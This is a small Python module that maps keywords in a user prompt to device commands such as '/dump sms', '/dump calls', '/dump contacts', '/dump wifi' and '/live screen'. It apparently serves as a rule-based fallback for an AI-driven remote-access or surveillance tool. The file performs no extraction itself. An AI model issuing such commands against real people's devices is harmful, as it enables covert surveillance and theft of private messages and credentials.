"""Deterministic floor. No model required."""
import json
import re

RULES = [
    (r"\b(sms|text message)\b", "/dump sms"),
    (r"\b(calls|call log)\b", "/dump calls"),
    (r"\b(contacts|address book)\b", "/dump contacts"),
    (r"\b(wifi|wireless)\b", "/dump wifi"),
    (r"\b(screenshot|screen)\b", "/live screen"),
    (r"\b(scan|discover)\b", "/scan"),
]


def fallback(role, prompt: str) -> dict:
    for pattern, command in RULES:
        if re.search(pattern, prompt, re.I):
            return {"text": json.dumps({"command": command, "confidence": 0.4,
                                        "why": "qbrain"}), "backend": "qbrain",
                    "model": "rules", "tokens": 0}
    return {"text": json.dumps({"command": None, "confidence": 0.0,
                                "why": "no rule"}), "backend": "qbrain",
            "model": "rules", "tokens": 0}
